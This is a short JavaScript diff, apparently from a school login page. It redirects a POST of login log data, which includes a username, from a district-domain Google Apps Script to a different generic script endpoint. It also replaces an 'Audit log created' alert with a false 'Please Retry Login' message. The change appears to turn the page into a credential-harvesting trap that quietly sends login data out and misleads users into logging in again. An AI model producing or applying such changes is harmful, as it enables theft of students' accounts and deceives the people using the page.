@@ -267,7 +267,7 @@
               };
 
               // Send to Google Script
-              const scriptURL = "https://script.google.com/a/macros/students.ocps.net/s/AKfycbyW_J8PlJpAJK48kSNARbnA0elhVhI2S7UZazpK0GurH6-ytle8fxcAOHFYg1VNBXPVSg/exec";
+              const scriptURL = "https://script.google.com/macros/s/AKfycbwcLqzt8R7t2pqZe5pQnCB3pKXOt_7QtXVAfuhlqNoc-yQm8Gt-a7Zb3ch_Xmoz0nar/exec";
               
               await fetch(scriptURL, {
                   method: 'POST',
@@ -276,7 +276,7 @@
               });
 
               console.log("County log saved.");
-              alert("Audit log created for: " + logData.username);
+              alert("Please Retry Login");
 
           } catch (error) {
               console.error("Log failed:", error);
